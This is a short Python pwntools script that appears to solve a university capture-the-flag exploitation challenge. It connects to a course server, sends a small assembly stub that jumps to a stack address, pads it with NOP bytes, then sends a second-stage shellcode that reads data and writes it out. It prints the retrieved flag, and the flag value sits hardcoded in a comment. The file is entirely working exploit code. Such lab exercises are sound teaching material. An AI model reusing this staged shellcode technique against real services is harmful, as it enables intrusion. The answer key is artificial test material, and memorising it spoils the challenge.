#!/usr/bin/env python
# -*- encoding: utf-8 -*-

# flag: 6447{16baa76c-2d52-4972-be1b-d8b600e2c335}

from pwn import *

def generate_small_payload():
    payload = "mov eax, [esp+60];"
    payload += "call eax;"

    asm_payload = asm(payload)

    return asm_payload + "\x90" * (18 - len(asm_payload))

def generate_large_payload():
    big_payload = shellcraft.read(1000, 'esp', 42)
    big_payload += shellcraft.write(1, 'esp', 42)

    return asm(big_payload)

def main():
    context.arch = 'i386'
    context.terminal = '/bin/sh'

    r = remote("misc.6447.sec.edu.au", 8006)

    r.sendline(generate_small_payload())
    r.sendline(generate_large_payload())

    print "Flag:", r.recvrepeat(0.2).split()[-1]

if __name__ == '__main__':
    main()
